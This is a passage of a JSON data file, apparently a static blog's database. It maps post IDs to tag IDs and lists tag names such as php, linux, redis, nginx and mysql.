4vqcpqvyaj6","_id":"ck9z76vzx001u44vqwd6x0o0f"},{"post_id":"ck9z76vzv001n44vq9idusgsm","tag_id":"ck9z76vzp001344vqjxakn659","_id":"ck9z76vzy001y44vqxeu0urc1"},{"post_id":"ck9z76vzk000m44vqdjzn118e","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76vzz002244vqi5f392xx"},{"post_id":"ck9z76vzm000q44vqwuvqma1e","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w01002644vqfna6kcr4"},{"post_id":"ck9z76w01002744vqwws5i1oy","tag_id":"ck9z76vzb000744vq1nc8gwos","_id":"ck9z76w03002c44vq69ke3crr"},{"post_id":"ck9z76vzn000x44vqeoant4q1","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w03002e44vq5uvyebte"},{"post_id":"ck9z76vzo000z44vqnmxvfqu5","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w04002k44vqnhpoyvbf"},{"post_id":"ck9z76w04002l44vqr6uxmbxj","tag_id":"ck9z76vzn000w44vqxmj5ljju","_id":"ck9z76w06002q44vq1ugnz414"},{"post_id":"ck9z76vzp001444vqwdzgy6be","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w07002t44vq7okjjha1"},{"post_id":"ck9z76w06002r44vqrrtsrv4w","tag_id":"ck9z76vzi000i44vqf1k0iidb","_id":"ck9z76w08002x44vqar1b1g6x"},{"post_id":"ck9z76vzq001744vql9tpfnx9","tag_id":"ck9z76w06002o44vqwz9yot1q","_id":"ck9z76w08002z44vqg88pdnw6"},{"post_id":"ck9z76vzr001b44vqbdqhut86","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w09003444vqhsunsdhd"},{"post_id":"ck9z76vzs001c44vqsbtidmam","tag_id":"ck9z76w08003144vq7bqis3l4","_id":"ck9z76w09003844vqw8lqq2fy"},{"post_id":"ck9z76vzu001j44vqf9cpgeb3","tag_id":"ck9z76w09003744vq9uqulgvl","_id":"ck9z76w0a003c44vqf9h0f7an"},{"post_id":"ck9z76vzw001r44vqyov2iu83","tag_id":"ck9z76w0a003b44vqlveu7fmr","_id":"ck9z76w0b003g44vq98eg9p88"},{"post_id":"ck9z76vzx001v44vq9tsv1ghg","tag_id":"ck9z76w0b003f44vqaqqc8xde","_id":"ck9z76w0b003k44vqb65277pm"},{"post_id":"ck9z76vzy001z44vqmykcgqgw","tag_id":"ck9z76w0b003j44vq29nr02uf","_id":"ck9z76w0c003o44vq9emwqwkp"},{"post_id":"ck9z76w00002344vqsn7cg7nb","tag_id":"ck9z76w0b003j44vq29nr02uf","_id":"ck9z76w0c003r44vq4ke9f6vr"},{"post_id":"ck9z76w02002a44vq2iky78wx","tag_id":"ck9z76w0b003j44vq29nr02uf","_id":"ck9z76w0d003u44vq9hpsdfsn"},{"post_id":"ck9z76w03002d44vq4gk21oxh","tag_id":"ck9z76w06002o44vqwz9yot1q","_id":"ck9z76w0d003w44vq2fx2tk8a"},{"post_id":"ck9z76w03002g44vqj2isbbm7","tag_id":"ck9z76w0d003v44vq2gkema8r","_id":"ck9z76w0d003y44vqustrfwzf"},{"post_id":"ck9z76w05002m44vq2bn6hp33","tag_id":"ck9z76w0d003x44vq0mxxwb8l","_id":"ck9z76w0e003z44vqreiiewpy"},{"post_id":"ck9z76w0v004044vqvf8x6wlg","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76w0w004144vqt0twcffo"}],"Tag":[{"name":"linux","_id":"ck9z76vzb000744vq1nc8gwos"},{"name":"vue","_id":"ck9z76vzi000i44vqf1k0iidb"},{"name":"redis","_id":"ck9z76vzn000w44vqxmj5ljju"},{"name":"mac","_id":"ck9z76vzp001344vqjxakn659"},{"name":"php","_id":"ck9z76vzr001a44vqcpqvyaj6"},{"name":"ssr","_id":"ck9z76w06002o44vqwz9yot1q"},{"name":"google","_id":"ck9z76w08003144vq7bqis3l4"},{"name":"shell","_id":"ck9z76w09003744vq9uqulgvl"},{"name":"api","_id":"ck9z76w0a003b44vqlveu7fmr"},{"name":"PHPStudy","_id":"ck9z76w0b003f44vqaqqc8xde"},{"name":"tool","_id":"ck9z76w0b003j44vq29nr02uf"},{"name":"mysql","_id":"ck9z76w0d003v44vq2gkema8r"},{"name":"nginx","_id":"ck9z76w0d003x44vq0mxxwb8l"}]}}